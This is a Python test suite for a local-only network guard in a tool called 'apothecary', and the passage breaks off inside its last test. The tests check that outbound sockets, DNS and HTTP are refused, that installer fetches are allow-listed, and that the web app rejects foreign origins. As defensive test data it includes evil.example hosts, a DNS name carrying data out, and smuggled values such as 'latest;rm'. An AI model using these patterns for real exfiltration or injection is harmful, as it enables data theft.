"""Nothing apothecary runs reaches past this machine (apothecary/stays_local.py)."""

from __future__ import annotations

import _socket
import ast
import http.client
import json
import os
import re
import socket
import ssl
import subprocess
import sys
from pathlib import Path
from urllib.parse import urlsplit

import pytest
from fastapi.testclient import TestClient

from apothecary import stays_local
from apothecary.api import app
from apothecary.vision import PlainFinder, ScaleReference, StatedFinder, picture_to_site
from apothecary.vocabulary import starter_words

ROOT = Path(__file__).resolve().parents[1]
PACKAGE = ROOT / "apothecary"


# The picture path runs under the guard the root conftest.py and the vision
# package put on the process: a connection past this machine raises LeftTheMachine.


@pytest.fixture
def picture(tmp_path) -> Path:
    from PIL import Image, ImageDraw

    image = Image.new("L", (300, 200), 255)
    pen = ImageDraw.Draw(image)
    pen.rectangle((20, 20, 120, 90), fill=0)
    pen.ellipse((160, 40, 260, 140), fill=0)
    path = tmp_path / "offline.png"
    image.save(path)
    return path


def test_looking_at_a_picture_reaches_nothing(picture):
    assert len(PlainFinder().look(picture).shapes) == 2


def test_reading_a_written_description_reaches_nothing(tmp_path):
    image = tmp_path / "described.png"
    image.write_bytes(b"never opened")
    (tmp_path / "described.shapes.json").write_text(
        '{"name":"d","pixel_width":10,"pixel_height":10,'
        '"shapes":[{"kind":"rect","min":[0,0],"max":[1,1]}]}'
    )
    assert len(StatedFinder().look(image).shapes) == 1


def test_building_an_arrangement_reaches_nothing(picture):
    site = picture_to_site(
        PlainFinder().look(picture), scale=ScaleReference(millimetres_across=300)
    )
    assert site.render()


def test_the_word_list_reaches_nothing():
    for word in starter_words().all():
        assert word.make(word.name).to_scad_object().render()


def test_the_whole_path_end_to_end_reaches_nothing(picture, tmp_path):
    from click.testing import CliRunner

    from apothecary.cli import cli

    out = tmp_path / "made.scad"
    result = CliRunner().invoke(
        cli, ["photo", "build", str(picture), "--width-mm", "300", "--out", str(out)]
    )
    assert result.exit_code == 0, result.output
    assert out.exists()


def test_nothing_is_written_outside_the_folder_it_was_given(picture, tmp_path):
    """The other half of the rule: what it produces stays where you put it."""
    from click.testing import CliRunner

    from apothecary.cli import cli

    before = set(Path.cwd().iterdir())
    out = tmp_path / "elsewhere.scad"
    result = CliRunner().invoke(
        cli, ["photo", "build", str(picture), "--width-mm", "300", "--out", str(out)]
    )
    assert result.exit_code == 0, result.output
    assert set(Path.cwd().iterdir()) == before, "something was written outside the given folder"


# Where the guard goes on: the first statement of each module through which
# apothecary runs or reads personal data, and the tests' root conftest.py.
INSTALL_POINTS = {
    "apothecary.api": PACKAGE / "api.py",
    "apothecary.cli": PACKAGE / "cli" / "__init__.py",
    "apothecary.vision": PACKAGE / "vision" / "__init__.py",
    "apothecary.gathering": PACKAGE / "gathering" / "__init__.py",
    "apothecary.firmware": PACKAGE / "firmware" / "__init__.py",
    "apothecary.routes": PACKAGE / "routes" / "__init__.py",
}
ROOT_CONFTEST = ROOT / "conftest.py"


def _fresh(code: str, *args: str) -> subprocess.CompletedProcess:
    """Run ``code`` in an interpreter of its own, so what an import does is its own."""
    return subprocess.run(
        [sys.executable, "-c", code, *args],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=120,
    )


# The geometry library: the package itself, its shapes, transforms, scene,
# templates, models and meshes, and every part and assembly under
# apothecary.projects.
GEOMETRY_LIBRARY = (
    "apothecary",
    "apothecary.booleans",
    "apothecary.core",
    "apothecary.primitives",
    "apothecary.transforms",
    "apothecary.scene",
    "apothecary.templates",
    "apothecary.models",
    "apothecary.meshes",
    "apothecary.hierarchy",
)

LEAVES_THE_NETWORK_AS_IT_FOUND_IT = """
import _socket, http.client, importlib, pkgutil, socket, ssl, sys

def names():  # ids: the guard would rebind a name held for a class itself
    return tuple(map(id, (socket.socket, socket.SocketType, _socket.socket, _socket.SocketType,
            ssl.socket, socket.create_connection, http.client.HTTPConnection.connect,
            socket.getaddrinfo, _socket.getaddrinfo, socket.gethostbyname,
            socket.gethostbyaddr, socket.getnameinfo)))

before = names()
events = []

def hear(event, args):
    if event.startswith("socket."):
        events.append(event)

sys.addaudithook(hear)
for name in sys.argv[1:]:
    importlib.import_module(name)
for package in ("apothecary.projects", "apothecary.models"):
    path = importlib.import_module(package).__path__
    for found in pkgutil.walk_packages(path, package + "."):
        importlib.import_module(found.name)
assert names() == before, "importing the geometry library replaced a name for a socket"
assert not events, f"importing the geometry library made a socket call: {events}"
guarded = ("apothecary.api", "apothecary.cli", "apothecary.vision", "apothecary.gathering",
           "apothecary.firmware", "apothecary.routes")
loaded = sorted(m for m in sys.modules if m in guarded or m.startswith(tuple(g + "." for g in guarded)))
assert not loaded, f"the geometry library imported a guarded module: {loaded}"
guard = sys.modules.get("apothecary.stays_local")
assert guard is None or not guard.guard_installed(), "the geometry library installed the guard"
print("left as found")
"""


def test_importing_the_geometry_library_leaves_the_network_as_it_found_it():
    """A program that imports apothecary for its shapes keeps its network: the
    import installs nothing, replaces no name for a socket, and makes no socket
    and looks up no name while it loads (an audit hook hears no ``socket.*``)."""
    run = _fresh(LEAVES_THE_NETWORK_AS_IT_FOUND_IT, *GEOMETRY_LIBRARY)
    assert run.returncode == 0, run.stderr
    assert run.stdout.strip() == "left as found"


GUARDS_THE_PROCESS = """
import importlib, socket, sys
import apothecary
from apothecary import stays_local
assert not stays_local.guard_installed(), "import apothecary installed the guard"
before = id(socket.socket)  # an id: the guard rebinds every name for the class itself
importlib.import_module(sys.argv[1])
assert stays_local.guard_installed(), f"importing {sys.argv[1]} did not install the guard"
assert id(socket.socket) != before
try:
    socket.create_connection(("203.0.113.1", 80), timeout=1)
except stays_local.LeftTheMachine:
    print("guarded")
"""


@pytest.mark.parametrize("point", list(INSTALL_POINTS))
def test_importing_an_install_point_puts_the_guard_on_the_process(point):
    run = _fresh(GUARDS_THE_PROCESS, point)
    assert run.returncode == 0, run.stderr
    assert run.stdout.strip() == "guarded"


def test_a_test_session_is_under_the_guard_before_its_first_test_is_collected():
    """pytest loads the root conftest.py before it collects a test; loading it
    puts the guard on."""
    run = _fresh(
        "import importlib.util, sys\n"
        "spec = importlib.util.spec_from_file_location('root_conftest', sys.argv[1])\n"
        "spec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
        "from apothecary import stays_local\n"
        "print('guarded' if stays_local.guard_installed() else 'open')\n",
        str(ROOT_CONFTEST),
    )
    assert run.returncode == 0, run.stderr
    assert run.stdout.strip() == "guarded"


@pytest.mark.parametrize(
    "source", [*INSTALL_POINTS.values(), ROOT_CONFTEST], ids=[*INSTALL_POINTS, "conftest"]
)
def test_each_install_point_puts_the_guard_on_before_any_of_its_own_code(source):
    """The guard's import and its call are the first two statements, after the
    docstring: nothing of the module runs before the guard is on."""
    body = ast.parse(source.read_text(encoding="utf-8")).body
    if body and isinstance(body[0], ast.Expr) and isinstance(body[0].value, ast.Constant):
        body = body[1:]
    first, second = body[0], body[1]
    assert isinstance(first, ast.ImportFrom), "the first statement is not the guard's import"
    assert (first.module or "").split(".")[-1] == "stays_local"
    assert [alias.name for alias in first.names] == ["install_guard"]
    called = first.names[0].asname or "install_guard"
    assert isinstance(second, ast.Expr) and isinstance(second.value, ast.Call)
    assert getattr(second.value.func, "id", None) == called, "the second statement is not the call"


# What reads personal data, by the means the record names: the serial link, an
# image library, the state folder and the picture root. Outside the install
# points' packages none of it is done, but through one of them: the state folder
# is apothecary.firmware's to resolve and the picture root apothecary.api's, so a
# module that calls either has imported an install point first.
GUARDED_SOURCES = ("api.py", "cli/", "vision/", "gathering/", "firmware/", "routes/")
READER_MODULES = {"serial": "the serial link", "PIL": "an image library"}
READER_VARIABLES = {"APOTHECARY_STATE_DIR", "APOTHECARY_PICTURE_ROOT"}
RESOLVED_BY = {"state_dir": "apothecary.firmware", "_picture_root": "apothecary.api"}


def _imported_from(node: ast.ImportFrom, package: str) -> str:
    """The absolute module an ``ImportFrom`` names, from the package it is written in."""
    if not node.level:
        return node.module or ""
    base = package.split(".")[: len(package.split(".")) - node.level + 1]
    return ".".join(base + ([node.module] if node.module else []))


def _personal_data_readers(text: str, package: str) -> list:
    """What a module does that reads personal data where no install point covers it."""
    tree = ast.parse(text)
    found = []
    imported = {
        _imported_from(node, package) for node in ast.walk(tree) if isinstance(node, ast.ImportFrom)
    }
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                if top in READER_MODULES:
                    found.append(f"imports {alias.name} ({READER_MODULES[top]})")
        elif isinstance(node, ast.ImportFrom):
            module = _imported_from(node, package)
            if not node.level and module.split(".")[0] in READER_MODULES:
                found.append(f"imports from {module} ({READER_MODULES[module.split('.')[0]]})")
        elif isinstance(node, ast.Call):
            func = node.func
            name = getattr(func, "id", None) or getattr(func, "attr", None)
            if name in RESOLVED_BY:
                owner = RESOLVED_BY[name]
                if not any(m == owner or m.startswith(owner + ".") for m in imported):
                    found.append(f"calls {name}() without importing it from {owner}")
            reads_env = (
                isinstance(func, ast.Attribute)
                and func.attr in ("get", "getenv", "pop")
                and node.args
                and isinstance(node.args[0], ast.Constant)
                and node.args[0].value in READER_VARIABLES
            )
            if reads_env:
                found.append(f"reads {node.args[0].value} itself")
        elif isinstance(node, ast.Subscript) and isinstance(node.ctx, ast.Load):
            key = node.slice
            if isinstance(key, ast.Constant) and key.value in READER_VARIABLES:
                found.append(f"reads {key.value} itself")
    return found


@pytest.mark.parametrize(
    "code",
    [
        "import serial",
        "from serial.tools import list_ports",
        "from PIL import Image",
        "def f():\n    from .projects import x\n    return state_dir()",
        "import os\nos.environ.get('APOTHECARY_STATE_DIR')",
        "import os\nos.getenv('APOTHECARY_PICTURE_ROOT')",
        "import os\nos.environ['APOTHECARY_STATE_DIR']",
        "from .scene import Scene\n_picture_root()",
    ],
)
def test_the_reader_scan_sees_each_way_of_reading_personal_data(code):
    assert _personal_data_readers(code, "apothecary")


def test_no_module_outside_the_install_points_reads_personal_data():
    """A module that reads personal data where no install point covers it fails
    here before it merges: the guard goes on by package, so a reader written
    elsewhere would read with the network open. Reaching the state folder
    through apothecary.firmware (jobs, the slicer's service) is under the guard
    from that import on."""
    readers = {}
    for source in sorted(PACKAGE.rglob("*.py")):
        rel = source.relative_to(PACKAGE).as_posix()
        if rel.startswith(GUARDED_SOURCES) or rel == "stays_local.py":
            continue
        parts = source.relative_to(ROOT).with_suffix("").parts
        package = ".".join(parts if source.name == "__init__.py" else parts[:-1])
        found = _personal_data_readers(source.read_text(encoding="utf-8"), package)
        if found:
            readers[rel] = found
    assert readers == {}


def test_the_guard_rebinds_every_name_for_a_socket():
    assert stays_local.guard_installed()
    assert socket.socket is not stays_local._original_socket
    assert socket.SocketType is _socket.socket and _socket.SocketType is _socket.socket
    assert ssl.socket is socket.socket


def _with(make, act):
    """Make a socket, do one thing with it, and close it (the C class has no `with`)."""
    sock = make()
    try:
        act(sock)
    finally:
        sock.close()


def _tcp(act, family=socket.AF_INET):
    _with(lambda: socket.socket(family), act)


def _udp(act):
    _with(lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM), act)


def _tls(act):
    # Wrapped before it connects: urllib's other order.
    context = ssl.create_default_context()
    _with(lambda: context.wrap_socket(socket.socket(), server_hostname="example.com"), act)


ELSEWHERE = ("203.0.113.1", 80)

WAYS_OUT = {
    "connect to an address": lambda: _tcp(lambda s: s.connect(ELSEWHERE)),
    "connect to a name": lambda: _tcp(lambda s: s.connect(("example.com", 443))),
    "connect over IPv6": lambda: _tcp(
        lambda s: s.connect(("2001:db8::1", 80, 0, 0)), socket.AF_INET6
    ),
    "connect through TLS": lambda: _tls(lambda s: s.connect(("203.0.113.1", 443))),
    "connect the C-level socket": lambda: _with(_socket.socket, lambda s: s.connect(ELSEWHERE)),
    "connect a socket.SocketType": lambda: _with(socket.SocketType, lambda s: s.connect(ELSEWHERE)),
    "connect an ssl.socket": lambda: _with(ssl.socket, lambda s: s.connect(ELSEWHERE)),
    "create_connection": lambda: socket.create_connection(ELSEWHERE, timeout=1),
    "http.client": lambda: http.client.HTTPConnection("example.com", 80, timeout=1).connect(),
    "sendto": lambda: _udp(lambda s: s.sendto(b"x", ("203.0.113.1", 53))),
    "sendmsg": lambda: _udp(lambda s: s.sendmsg([b"x"], [], 0, ("203.0.113.1", 9))),
    "bind to every address": lambda: _tcp(lambda s: s.bind(("0.0.0.0", 0))),
    "bind to the empty host": lambda: _tcp(lambda s: s.bind(("", 0))),
    "bind to a LAN address": lambda: _tcp(lambda s: s.bind(("192.168.1.10", 0))),
    "bind to a name": lambda: _tcp(lambda s: s.bind(("carried.example", 0))),
    # A name is the one thing that could carry data out without a connection.
    "getaddrinfo": lambda: socket.getaddrinfo("example.com", 80),
    "getaddrinfo a name carrying data": lambda: socket.getaddrinfo(
        "secret-in-a-name.evil.example", 80
    ),
    "getaddrinfo in bytes": lambda: socket.getaddrinfo(b"example.com", 80),
    "gethostbyname": lambda: socket.gethostbyname("example.com"),
    "gethostbyaddr a name": lambda: socket.gethostbyaddr("carried-out.example"),
    "gethostbyaddr an address": lambda: socket.gethostbyaddr("203.0.113.1"),
    "getnameinfo": lambda: socket.getnameinfo(("203.0.113.1", 443), 0),
    # The resolver's stub on loopback port 53 forwards whatever it is handed.
    "sendto the resolver stub": lambda: _udp(lambda s: s.sendto(b"\x00" * 12, ("127.0.0.53", 53))),
    "connect to loopback port 53": lambda: _udp(lambda s: s.connect(("127.0.0.1", 53))),
}


@pytest.mark.parametrize("way_out", WAYS_OUT.values(), ids=list(WAYS_OUT))
def test_every_way_past_this_machine_is_refused(way_out):
    with pytest.raises(stays_local.LeftTheMachine):
        way_out()


@pytest.fixture
def loopback_port():
    listener = stays_local._original_socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    yield listener.getsockname()[1]
    listener.close()


def test_this_machine_is_still_reachable(loopback_port):
    with socket.socket() as s:
        s.settimeout(2)
        s.connect(("127.0.0.1", loopback_port))
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendmsg([b"x"], [], 0, ("127.0.0.1", loopback_port))
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
    for name in ("localhost", "127.0.0.1", "::1", "203.0.113.1", None):
        socket.getaddrinfo(name, loopback_port)  # this machine's names, and literals
    numeric = socket.getnameinfo(("127.0.0.1", loopback_port), socket.NI_NUMERICHOST)
    assert numeric[0] == "127.0.0.1"


def test_a_tool_fetch_reaches_its_sources_and_nothing_else(monkeypatch):
    """An installer's download is the one kind of connection past this machine:
    to fixed hosts, for the duration of one call on one thread, and a redirect
    elsewhere is refused mid-fetch."""
    reached = []
    monkeypatch.setattr(
        stays_local, "_original_http_connect", lambda self: reached.append(self.host)
    )
    with pytest.raises(stays_local.LeftTheMachine):
        stays_local.tool_fetch("https://evil.example/arduino-cli.tar.gz")
    with pytest.raises(stays_local.LeftTheMachine):
        http.client.HTTPConnection("api.github.com").connect()  # outside a fetch: no
    with stays_local.tool_fetch("https://api.github.com/repos/arduino/arduino-cli/releases/latest"):
        http.client.HTTPConnection("api.github.com").connect()
        http.client.HTTPConnection(
            "objects.githubusercontent.com"
        ).connect()  # where the archive redirects
        with pytest.raises(stays_local.LeftTheMachine):
            http.client.HTTPConnection("evil.example").connect()  # a redirect elsewhere
        assert stays_local._name_allowed("github.com")
        assert not stays_local._name_allowed("evil.example")
        # Inside the window a raw socket reaches a source by name, or an address
        # the resolver returned for one -- those hosts alone, not anywhere.
        with pytest.raises(stays_local.LeftTheMachine):
            socket.socket().connect(("203.0.113.1", 443))
        monkeypatch.setattr(
            stays_local,
            "_original_getaddrinfo",
            lambda host, port, *a, **k: [(2, 1, 6, "", ("203.0.113.7", 443))],
        )
        socket.getaddrinfo("github.com", 443)
        assert stays_local._address_allowed(("203.0.113.7", 443))
        assert not stays_local._address_allowed(("203.0.113.8", 443))
        assert not stays_local._address_allowed(("github.com", 53))
        assert stays_local._allowed_now()
    assert not stays_local._allowed_now()
    assert getattr(stays_local._fetching, "addresses", None) is None
    assert reached == ["api.github.com", "objects.githubusercontent.com"]
    # The allowance is per thread: another thread is not in the fetch.
    import threading

    seen = {}

    def other():
        seen["allowed"] = stays_local._allowed_now()

    with stays_local.tool_fetch("https://github.com/x"):
        t = threading.Thread(target=other)
        t.start()
        t.join()
    assert seen == {"allowed": False}


def test_a_tool_fetch_takes_no_proxy_and_a_version_is_three_numbers(monkeypatch):
    """A proxy variable is a place the fetch would go instead; the installer's opener
    has none. And a version is spliced into the release URL, so it is X.Y.Z or nothing."""
    from apothecary.firmware import installer

    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")  # loopback, so the guard allows it
    monkeypatch.setenv("HTTP_PROXY", "http://127.0.0.1:9")
    opened = {}

    class Opener:
        def open(self, req, timeout=None):
            opened["url"] = req.full_url
            raise OSError("not reached")

    def build_opener(*handlers):
        assert len(handlers) == 1 and isinstance(handlers[0], installer.urllib.request.ProxyHandler)
        assert handlers[0].proxies == {}
        return Opener()

    monkeypatch.setattr(installer.urllib.request, "build_opener", build_opener)
    with pytest.raises(OSError, match="not reached"):
        installer._fetch("https://github.com/arduino/arduino-cli/releases/download/v1.2.3/x")
    assert opened["url"].startswith("https://github.com/")
    assert installer.resolve_version("v1.5.1", fetch=lambda url: b"") == "1.5.1"
    for bad in ("../../other/repo/releases/download/v1", "1.5", "1.5.1/../x", "latest;rm"):
        with pytest.raises(installer.ToolchainError, match="not an arduino-cli version"):
            installer.resolve_version(bad, fetch=lambda url: b"")


def _callers_of_tool_fetch() -> set:
    """Every module under apothecary/ that names ``tool_fetch``, read from the source."""
    found = set()
    for source in PACKAGE.rglob("*.py"):
        if source.name == "stays_local.py" and source.parent == PACKAGE:
            continue
        tree = ast.parse(source.read_text(encoding="utf-8"), filename=str(source))
        for node in ast.walk(tree):
            named = (isinstance(node, ast.Name) and node.id == "tool_fetch") or (
                isinstance(node, ast.Attribute) and node.attr == "tool_fetch"
            )
            imported = isinstance(node, ast.ImportFrom) and any(
                alias.name == "tool_fetch" for alias in node.names
            )
            if named or imported:
                found.add(source.relative_to(ROOT).as_posix())
    return found


def test_a_tool_fetch_has_two_callers_the_two_installers():
    """The record allows one kind of connection past this machine, by two callers:
    the firmware installer (arduino-cli, and for Rust on the ESP32 rustup-init,
    espflash and Espressif's Xtensa archives, through the same fetch) and the OpenSCAD installer (a
    snapshot from files.openscad.org). A third is a change to the record first."""
    from apothecary.firmware import installer, rust_installer

    assert _callers_of_tool_fetch() == {
        "apothecary/firmware/installer.py",
        "apothecary/openscad_installer.py",
    }
    assert rust_installer._fetch is installer._fetch
    assert "files.openscad.org" in stays_local.TOOL_SOURCES
    # OpenSCAD's source, for a Linux arm64 build: the tarballs GitHub serves.
    assert "codeload.github.com" in stays_local.TOOL_SOURCES


# Every host `apothecary firmware install --rust-esp32` was seen to reach (strace
# of a real install, 2026-10-09), and the step that reaches it. A build reached none.
RUST_INSTALL_HOSTS = {
    "static.rust-lang.org": "apothecary's fetch of rustup-init and its .sha256",
    "api.github.com": "apothecary's fetch of the SHA-256 GitHub publishes for espflash's "
    "asset and the Xtensa Rust and rust-src archives, whose release has no checksum file",
    "github.com": "apothecary's fetch of espflash and of Espressif's Xtensa Rust, rust-src, "
    "LLVM and GCC archives and the checksum files their releases publish",
    "release-assets.githubusercontent.com": "where github.com redirects each release asset",
    "index.crates.io": "cargo vendor reading the sparse index for each locked crate",
    "static.crates.io": "cargo vendor downloading each locked crate",
}


def test_every_host_the_rust_install_reaches_is_on_the_install_time_list():
    assert set(RUST_INSTALL_HOSTS) <= stays_local.TOOL_SOURCES
    # espup's own update check went with espup: nothing asks crates.io's API.
    assert "crates.io" not in stays_local.TOOL_SOURCES


@pytest.mark.parametrize(
    "triple", ["x86_64-unknown-linux-gnu", "aarch64-apple-darwin", "x86_64-pc-windows-msvc"]
)
def test_every_url_the_rust_installer_fetches_is_a_tool_source_by_a_pinned_version(
    triple, tmp_path, monkeypatch
):
    """Each fetch is a GET of a pinned version's asset, from a tool source: refused
    before anything is opened if it were not. Every archive is checked before it is
    opened, and one that is not what its source publishes is refused."""
    import json as json_

    from apothecary.firmware import rust_installer as ri

    monkeypatch.setenv("APOTHECARY_TOOLS_DIR", str(tmp_path / "tools"))
    asked = []

    def fetch(url):
        stays_local.tool_fetch(url)  # the guard's own check of the host
        asked.append(url)
        if url.endswith(".sha256"):
            name = url.rsplit("/", 1)[1]
            return "".join(f"{'0' * 64} *{a.name}\n" for a in installer.archives()).encode() + (
                ("0" * 64 + " *rustup-init\n").encode() if name.startswith("rustup") else b""
            )
        if "/releases/tags/" in url:
            assets = [a.name for a in installer.archives()] + [f"espflash-{triple}.zip"]
            return json_.dumps(
                {"assets": [{"name": n, "digest": "sha256:" + "0" * 64} for n in assets]}
            ).encode()
        return b"x"

    def fetch_to(url, path):
        stays_local.tool_fetch(url)
        asked.append(url)
        return "f" * 64  # not what any source publishes

    installer = ri.RustEsp32Installer(
        fetch=fetch, fetch_to=fetch_to, run=lambda *a, **k: 0, triple=triple
    )
    with pytest.raises(ri.InstallError, match="checksum mismatch"):
        installer.install_rustup(None)
    for archive in installer.archives():
        with pytest.raises(ri.InstallError, match=f"checksum mismatch for {archive.name}"):
            installer.download(archive)
    with pytest.raises(ri.InstallError, match="checksum mismatch"):
        installer.install_espflash(None)
    hosts = {urlsplit(u).hostname for u in asked}
    assert hosts == {"static.rust-lang.org", "api.github.com", "github.com"}
    pins = (
        f"/{ri.RUSTUP_VERSION}/",
        f"/v{ri.ESPFLASH_VERSION}",
        f"/v{ri.XTENSA_RUST_VERSION}",
        f"/{ri.LLVM_VERSION}/",
        f"/esp-{ri.GCC_VERSION}/",
    )
    assert all(any(pin in u for pin in pins) for u in asked), asked


def test_a_rust_build_and_flash_reach_no_host(monkeypatch, tmp_path):
    """Offline from the vendored crates; rustup may not install a toolchain it lacks;
    espflash may not ask whether there is a newer espflash; and nothing in the
    environment points cargo or rustup elsewhere."""
    from apothecary.firmware.modules.rust_esp32 import CARGO, RustEsp32Module
    from apothecary.firmware.sketches import find_sketch

    monkeypatch.setenv("APOTHECARY_TOOLS_DIR", str(tmp_path / "tools"))
    monkeypatch.setenv("CARGO", "")
    monkeypatch.setenv("ESPFLASH", str(tmp_path / "espflash"))
    (tmp_path / "espflash").write_text("#!/bin/sh\n")
    cargo = CARGO.managed_path()
    cargo.parent.mkdir(parents=True)
    cargo.write_text("#!/bin/sh\n")
    (tmp_path / "tools" / "rust-esp32" / "vendor").mkdir()
    for key, value in {
        "HTTPS_PROXY": "http://proxy.example:3128",
        "CARGO_HTTP_PROXY": "http://proxy.example:3128",
        "CARGO_REGISTRIES_CRATES_IO_PROTOCOL": "git",
        "CARGO_SOURCE_CRATES_IO_REPLACE_WITH": "elsewhere",
        "CARGO_NET_OFFLINE": "false",
        "RUSTUP_DIST_SERVER": "https://evil.example",
        "RUSTUP_UPDATE_ROOT": "https://evil.example/rustup",
        "RUSTC_WRAPPER": "sccache",
        "GITHUB_TOKEN": "a-person-s-token",
    }.items():
        monkeypatch.setenv(key, value)
    sketch = find_sketch("esp32_blink@rust-esp32", ROOT)
    plan = RustEsp32Module().flash(sketch, None, "/dev/ttyFAKE0", tmp_path / "out")
    build, check, flash = plan.steps
    assert "--offline" in build
    # No folder it was built in -- and so no user name -- is in the image: rustc is
    # told to write each another way, and the build's last step holds it did.
    remaps = build[build.index("--config", build.index("--offline")) + 1]
    assert remaps.startswith("target.xtensa-esp32-none-elf.rustflags=[")
    assert f"'--remap-path-prefix={Path.home()}=/home'" in remaps
    assert check[1:4] == [
        "-m",
        "apothecary.firmware.image_paths",
        str(tmp_path / "out" / "xtensa-esp32-none-elf" / "release" / "esp32_blink"),
    ]
    assert str(Path.home()) in check
    assert 'source.crates-io.replace-with="apothecary-vendored"' in build
    assert flash[1:3] == ["flash", "--skip-update-check"] and "--non-interactive" in flash
    env = plan.env
    assert env["RUSTUP_AUTO_INSTALL"] == "0"
    assert env["ESPFLASH_SKIP_UPDATE_CHECK"] == "true"
    assert not [
        k
        for k in env
        if k.lower().endswith("_proxy")
        or k.startswith(("CARGO_REGISTRIES_", "CARGO_SOURCE_", "CARGO_NET_", "CARGO_HTTP_"))
        or k.startswith(("RUSTUP_DIST_", "RUSTUP_UPDATE_"))
        or k in ("RUSTC_WRAPPER", "GITHUB_TOKEN")
    ], sorted(env)


def test_the_openscad_installer_fetches_from_its_source_alone_by_a_date(monkeypatch):
    """A host that is not a tool source is refused before anything is opened; a
    snapshot's version is its date, three numbers, spliced into the URL."""
    from apothecary import openscad_installer

    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")
    opened = {}

    class Opener:
        def open(self, req, timeout=None):
            opened["url"] = req.full_url
            raise OSError("not reached")

    def build_opener(*handlers):
        assert len(handlers) == 1
        assert isinstance(handlers[0], openscad_installer.urllib.request.ProxyHandler)
        assert handlers[0].proxies == {}
        return Opener()

    monkeypatch.setattr(openscad_installer.urllib.request, "build_opener", build_opener)
    with pytest.raises(stays_local.LeftTheMachine):
        openscad_installer._fetch("https://evil.example/snapshots/")
    assert opened == {}
    with pytest.raises(OSError, match="not reached"):
        openscad_installer._fetch(openscad_installer.SNAPSHOTS)
    assert opened["url"] == "https://files.openscad.org/snapshots/"
    assert openscad_installer.check_date("2026.09.27") == "2026.09.27"
    for bad in ("../../x", "2026.9.27", "2026.09.27/../x", "latest;rm", "2026.09"):
        with pytest.raises(openscad_installer.InstallError, match="not an OpenSCAD snapshot date"):
            openscad_installer.check_date(bad)
    # A source build's tarball: a commit, 40 hex characters, spliced into a codeload URL.
    sha = "31f27b7522af858ebabed764e67ecc10d9e27add"
    with pytest.raises(OSError, match="not reached"):
        openscad_installer._fetch(f"https://codeload.github.com/openscad/openscad/tar.gz/{sha}")
    assert opened["url"].startswith("https://codeload.github.com/")
    assert openscad_installer.check_sha(sha) == sha
    for bad in ("../../x", sha[:7], sha + "/../x", "g" * 40, "master", sha.upper()):
        with pytest.raises(openscad_installer.InstallError, match="not a commit SHA"):
            openscad_installer.check_sha(bad)


def test_require_loopback_accepts_this_machine_only():
    for host in ("127.0.0.1", "localhost", "::1", "127.0.0.2"):
        assert stays_local.require_loopback(host) == host
    for host in ("0.0.0.0", "::", "192.168.1.10", "10.0.0.1", "apothecary.local", "example.com"):
        with pytest.raises(ValueError, match="this machine only"):
            stays_local.require_loopback(host)


@pytest.mark.parametrize(
    "path", ["/", "/viewer/sites/garage", "/static/ring.js", "/openapi.json", "/docs/README.md"]
)
def test_a_client_elsewhere_is_refused_by_every_route(path):
    r = TestClient(app, client=("192.168.1.20", 4444)).get(path)
    assert r.status_code == 403
    assert "this machine only" in r.text


@pytest.mark.parametrize("arrived_at", ["http://evil.example", "http://192.168.1.5:8000"])
def test_a_request_arriving_by_another_name_or_address_is_refused(arrived_at):
    """A page from elsewhere that pointed its own name at 127.0.0.1 arrives from loopback."""
    assert TestClient(app, base_url=arrived_at).get("/placed").status_code == 403


@pytest.mark.parametrize(
    ("host", "status"),
    [
        ("localhost:8000", 200),
        ("127.0.0.1", 200),
        ("[::1]:8000", 200),
        ("LOCALHOST", 200),
        ("localhost.", 200),
        ("evil.example:8000", 403),
        ("127.0.0.1.evil.example", 403),
        ("app.localhost", 403),
        ('127.0.0.1:8000"', 403),
        ("127.0.0.1:80x", 403),
        ("", 403),
        ("[::1", 403),
    ],
)
def test_the_host_asked_for_must_be_this_machine(host, status):
    assert TestClient(app).get("/placed", headers={"host": host}).status_code == status


def test_a_peer_the_server_cannot_name_is_not_this_machine():
    """A Unix socket or another ASGI server may give no client or server address."""
    scope = {"type": "http", "method": "GET", "headers": [(b"host", b"localhost:8000")]}
    assert not stays_local.from_this_machine(scope)
    assert not stays_local.from_this_machine({**scope, "client": None, "server": None})
    assert stays_local.from_this_machine(
        {**scope, "client": ("127.0.0.1", 5), "server": ("127.0.0.1", 8000)}
    )


def test_a_page_on_another_origin_cannot_send_here():
    """Refused whether or not a browser would preflight; a link from elsewhere still opens."""
    here = TestClient(app)
    foreign = {"origin": "https://evil.example", "sec-fetch-site": "cross-site"}
    assert here.post("/photos/gather", json={}, headers=foreign).status_code == 403
    assert here.get("/placed", headers=foreign).status_code == 403
    assert here.get("/placed", headers={"sec-fetch-site": "same-site"}).status_code == 403
    assert here.get("/placed", headers={"origin": "null"}).status_code == 403
    link = {
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
    }
    assert here.get("/viewer/sites/garage", headers=link).status_code == 200
    assert here.post("/photos/gather", json={}, headers=link).status_code == 403
    own = {"origin": "http://127.0.0.1:8000", "sec-fetch-site": "same-origin"}
    assert here.get("/placed", headers=own).status_code == 200
    assert here.get("/placed", headers={"sec-fetch-site": "none"}).status_code == 200


@pytest.mark.parametrize(
    "path",
    [
        "/viewer/sites/garage",
        "/firmware",
        "/firmware/monitor",
        "/docs/README.md",
        "/static/ring.js",
    ],
)
def test_every_page_carries_the_policy(path):
    r = TestClient(app).get(path)
    assert r.status_code == 200
    assert r.headers["content-security-policy"] == stays_local.CONTENT_SECURITY_POLICY
    assert r.headers["referrer-policy"] == "no-referrer"


def test_the_policy_keeps_a_page_to_this_origin():
    csp = stays_local.CONTENT_SECURITY_POLICY
    assert (
        "default-src 'self'" in csp and "connect-src 'self'" in csp and "form-action 'self'" in csp
    )
    assert "frame-ancestors 'none'" in csp and "frame-src 'none'" in csp
    assert "http:" not in csp and "https:" not in csp and "*" not in csp
    assert app.docs_url is None and app.redoc_url is None  # each would load from a CDN


def test_a_value_the_page_carries_cannot_become_script():
    """A query value the viewer writes into its script (`?focus=`) is emitted as JSON,
    never raw: a crafted link cannot run script in this origin and read it out. Every
    value a template puts in a script literal goes through `tojson`."""
    here = TestClient(app)
